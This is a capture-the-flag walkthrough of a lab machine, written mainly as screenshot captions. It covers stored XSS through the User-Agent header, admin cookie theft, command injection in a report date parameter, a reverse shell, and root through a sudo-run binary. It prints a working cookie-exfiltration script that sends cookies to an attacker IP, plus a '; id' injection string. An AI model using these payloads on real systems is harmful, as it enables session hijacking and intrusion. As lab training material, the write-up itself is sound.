**ip of the machine :- 10.129.1.248**

![](attachment/dd889889e9fcefe28bb3cc0bda17fe6d.png)
machine is on!!!

![](attachment/fa630331d0d7439bf2a60868a759cd72.png)
Got two open ports!!!

![](attachment/72f68ed224acd924a2c405874b5cd2d1.png)
Got versions of both the ports...

**changed the ip :- 10.129.49.229**

![](attachment/316577c60839ad1ee4a3e96a53eb676b.png)
only one options. Let's click on it and explore it...

![](attachment/0a4826e251bf75a0ae9bb5c9d87190c0.png)
Got a form, let's try adding some random stuff...
![](attachment/1b1a18f1c73fddf907676077a872c507.png)Nothing Happened...

![](attachment/2a5c584ddac820caed3737c3f5395ab2.png)
Added some random xss payload to check for xss.

![](attachment/9b3ed16c5b3e3ebacd996727422a6338.png)
It detected a hacking attempt but gave headers which is unusual...

![](attachment/9a5085ba7f36e662400b056d21671cdd.png)So added xss payload in User-agent to see if web application is vulnerable to xss because it blocked a hacking attempt. So though of doing it in User-agent header.

![](attachment/069be638f7dc57eee6a13d2e2c295eec.png)
Stored XSS confirmed.

![](attachment/568b0db33cf6c3b253b0d7a151de56ab.png)
Added a payload to get a cookie...
![](attachment/e6a2c56009703753758ae7f124b18d0d.png)
Because got an unauthorized page, so maybe there will be someone to access it...

![](attachment/9a582eb1e05dbfff326731a73d30eebb.png)
So after adding the payload "<script>var i=new Image(); i.src="http://10.10.14.41:5000/?cookie="+btoa(document.cookie);
</script>" got two cookies out of which one is ours, and one is admin's....

![](attachment/008d2eee3f6ba84aadf600c4a44c00b1.png)
Got admin's cookie.

![](attachment/9322ae062d5964c8f4b31f34ee31ed25.png)
So after adding the cookie got this in /dashboard web page...

![](attachment/24c8731a45e02f110c2b8d3c7cefdf0a.png)
Captured the request after clicking on the generate report button and saw date parameter being passed...

![](attachment/bc98df2cce0d55b18c1f01098b1be9e6.png)
So added "; id" to see if command injection is not and got a response...

![](attachment/8912083aee42a33b4d758879544b7370.png)
Well it is possible...

![](attachment/a12db167977fd6e99c097f508f0c0104.png)
Added the payload for revshell...

![](attachment/be8fd4aaa2d9a6d9fbdcf0e12316ef61.png)
Got rev shell by adding the payload...

![](attachment/c6ba6fe3b802d7411a746ad8233e5afd.png)
Found the user flag in user's home directory logged in as.

![](attachment/d963ed4e25ec37f2b082763648a4809a.png)
Didn't find any unusual SUID files...

![](attachment/42202889e7c254c58c6eeb52f3fb44df.png)
So saw that user can only run syscheck binary.

![](attachment/8a44bbe34dd7b89a59b36552db31fec1.png)
Saw the src. code of syscheck which is performing some system checks.....

![](attachment/8004c9777927168fd18becf75e6c25fd.png)
So in the src. code, it is interacting with a file in the same directory so created it in temp with bash shell and made it executable.

![](attachment/2c3770cf28d16dc6613edc6f55d94455.png)
Executed syscheck as root and got root flag...